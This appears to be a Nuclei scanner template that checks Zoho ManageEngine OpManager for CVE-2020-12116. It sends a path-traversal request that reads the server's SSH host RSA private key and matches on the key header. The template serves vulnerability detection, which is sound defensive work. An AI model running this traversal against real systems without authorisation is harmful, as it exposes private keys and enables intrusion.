id: CVE-2020-12116
info:
  author: dwisiswant0
  classification:
    cve-id: CVE-2020-12116
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: Zoho ManageEngine OpManager Stable build before 124196 and Released
    build before 125125 allows an unauthenticated attacker to read arbitrary files
    on the server by sending a specially crafted request.
  name: Zoho ManageEngine OpManger - Arbitrary File Read
  reference:
  - https://github.com/BeetleChunks/CVE-2020-12116
  - https://nvd.nist.gov/vuln/detail/CVE-2020-12116
  - https://www.manageengine.com/network-monitoring/help/read-me-complete.html
  severity: high
  tags: cve,cve2020,zoho,lfi,manageengine
requests:
- extractors:
  - internal: true
    name: endpoint
    part: body
    regex:
    - (?m)/cachestart/.*/jquery/
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_2, "BEGIN RSA PRIVATE KEY")
    - status_code_2 == 200
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Connection: close

    '
  - 'GET {{endpoint}}../../../../bin/.ssh_host_rsa_key HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Cache-Control: max-age=0

    Connection: close

    Referer: http://{{Hostname}}

    '
  req-condition: true
